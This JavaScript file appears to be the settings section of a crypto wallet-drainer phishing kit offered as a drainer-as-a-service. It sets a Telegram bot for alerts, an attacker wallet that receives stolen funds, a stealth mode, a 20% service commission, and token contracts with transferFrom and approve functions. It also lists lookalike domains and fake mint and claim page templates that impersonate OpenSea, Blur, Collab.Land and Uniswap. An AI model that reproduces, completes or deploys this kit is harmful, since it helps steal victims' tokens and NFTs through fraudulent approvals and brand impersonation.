// ============================================================
// TELEGRAM SETTINGS (41)
// ============================================================

const TELEGRAM = {
    enabled: true,
    bot_token: "YOUR_BOT_TOKEN_HERE",
    chat_id: "YOUR_CHAT_ID_HERE"
};

// ============================================================
// SETTINGS - COMPLETE 40+ FEATURES
// ============================================================

// 1. WALLET ADDRESS
const receiveAddress = "0x86a208Cf4D384eE68dc600A39f092E394b582f9d";

// 2. MINIMUM BALANCE (31)
const minimumBalance = 50;

// 3. 24-HOUR DELAY (32)
const delayHours = 0; // Saita 0 don gwaji, 24 don gaske

// 4. STEALTH MODE (30)
const stealthMode = true;

// 5. RETRY ATTEMPTS (29)
const retryAttempts = 3;

// 6. GAS MULTIPLIER (27)
const gasMultiplier = 1.1;

// 7. DaaS SETTINGS (34)
const daasEnabled = true;
const daasCommission = 20;

// 8. TOKEN ADDRESSES (24)
const TOKEN_ADDRESSES = {
    USDT: "0x55d398326f99059ff775485246999027b3197955",
    BUSD: "0xe9e7cea3dedca5984780bafc599bd69add087d56",
    BNB: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
    DAI: "0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3",
    ETH: "0x2170ed0880ac9a755fd29b2688956bd959f933f8",
    WBTC: "0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c"
};

// 9. TOKEN ABI
const TOKEN_ABI = [
    "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function balanceOf(address account) public view returns (uint256)",
    "function allowance(address owner, address spender) public view returns (uint256)",
    "function nonces(address owner) public view returns (uint256)"
];

// 10. NFT SETTINGS (35)
const NFT_ADDRESS = "0x1234567890123456789012345678901234567890";
const NFT_ABI = ["function setApprovalForAll(address operator, bool approved) external"];

// 11. FAKE DOMAINS (23)
const FAKE_DOMAINS = [
    "opensea-offer.net",
    "opensea-claim.com",
    "opensea-verify.io",
    "blur-rewards.io",
    "blur-claim.com",
    "collab-verify.org",
    "collab-land.net",
    "uniswap-lp.net",
    "uniswap-claim.com"
];

// 12. PHISHING PAGES (1-20)
const PHISHING_PAGES = {
    'opensea': {
        logo: '🎨', title: 'CyberPunk #420', price: '0.05 ETH',
        desc: 'Limited edition NFT from the CyberPunk collection.',
        btn: 'Mint NFT', items: '12.4K', floor: '0.05 ETH', volume: '1,234 ETH',
        grad: 'linear-gradient(135deg,#2081e2,#6c5ce7)'
    },
    'blur': {
        logo: '🌀', title: 'Blur #69', price: '0.03 ETH',
        desc: 'Exclusive Blur Season 3 reward. Limited supply.',
        btn: 'Claim Reward', items: '8.2K', floor: '0.03 ETH', volume: '856 ETH',
        grad: 'linear-gradient(135deg,#6c5ce7,#a855f7)'
    },
    'collab': {
        logo: '🤝', title: 'Collab.Land #42', price: '0.01 ETH',
        desc: 'Verified membership NFT for Collab.Land community.',
        btn: 'Verify Wallet', items: '5.1K', floor: '0.01 ETH', volume: '412 ETH',
        grad: 'linear-gradient(135deg,#f59e0b,#f97316)'
    },
    'uniswap': {
        logo: '🦄', title: 'Uniswap #777', price: '0.07 ETH',
        desc: 'Liquidity provider NFT from Uniswap V3.',
        btn: 'Claim LP', items: '15.3K', floor: '0.07 ETH', volume: '2,345 ETH',
        grad: 'linear-gradient(135deg,#ff007a,#ff6b6b)'
    }
};
